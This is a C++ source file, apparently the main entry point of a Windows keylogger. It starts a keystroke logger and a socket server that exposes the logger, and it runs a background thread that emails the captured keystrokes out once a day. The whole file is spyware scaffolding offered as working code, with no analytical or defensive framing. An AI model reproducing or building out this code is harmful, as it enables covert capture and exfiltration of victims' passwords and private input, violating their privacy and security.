// Keylogger.cpp : Defines the entry point for the console application.
//


#ifndef _WINSOCKAPI_
#define _WINSOCKAPI_
#endif // !_WINSOCKAPI_
#define WIN32_LEAN_AND_MEAN
#ifndef WIN32_LEAN_AND_MEAN
#endif // !WIN32_LEAN_AND_MEAN
#include "stdafx.h"
#include <string>
#include <cstdlib>
#include <memory>
#include <io.h>
#include <fcntl.h>
#include <thread>
#include <tchar.h>
#include <windows.h>
#include <stdio.h>
#include <chrono>
#include <ctime>

#include "Keylogger.h"
#include "SocketServer.h"

extern "C" { FILE __iob_func[3] = { *stdin,*stdout,*stderr }; }

#define SECONDS_IN_DAY 86400
#define CHECK_TIME_INTERVAL 1800

shared_ptr<Keylogger> logger;
shared_ptr<SocketServer> socketServer;
time_t prevEmailReportTime = 0;

LRESULT CALLBACK WndProc(HWND hWnd, UINT message,
	WPARAM wParam, LPARAM lParam);
void socketThreadProc();
void mailerThreadProc();

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR lpCmdLine, INT iCmdShow) {

	// Add console for debug
	AllocConsole();
	freopen("CONOUT$", "w", stdout);
	freopen("CONOUT$", "w", stderr);

	MSG msg;
	WNDCLASS wndClass;
	wndClass.lpfnWndProc = WndProc;
	wndClass.cbClsExtra = 0;
	wndClass.cbWndExtra = 0;
	wndClass.hInstance = hInstance;
	wndClass.hCursor = LoadCursor(NULL, IDC_ARROW);
	wndClass.hbrBackground = NULL;
	wndClass.lpszMenuName = NULL;
	wndClass.lpszClassName = L"window";
	RegisterClass(&wndClass);

	logger = make_shared<Keylogger>();
	logger->start();

	socketServer = make_shared<SocketServer>(logger.get());
	std::thread socketThread(socketThreadProc);
	std::thread mailerThread(mailerThreadProc);
	while (GetMessage(&msg, NULL, 0, 0)) {
		DispatchMessage(&msg);
	}

	socketThread.join();
	return msg.wParam;
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message,
	WPARAM wParam, LPARAM lParam) {
	switch (message) {
	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;
	case WM_QUIT:
	case WM_CLOSE:
		logger->stop();
		return 0;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
}

void socketThreadProc() {
	socketServer->start();
}

void mailerThreadProc() {
	while (true) {
		std::this_thread::sleep_for(std::chrono::seconds(CHECK_TIME_INTERVAL));
		time_t currentTime = time(nullptr);

		if (currentTime - prevEmailReportTime > SECONDS_IN_DAY) {
			// Send email in setted up interval of time
			std::cout << "hello" << std::endl;
			bool result = logger->sendEmailReport(L"", true);
			if (result) {
				prevEmailReportTime = currentTime;
				std::cout << "ok";
			} else {
				std::cout << "error";
			}
		}
	}
}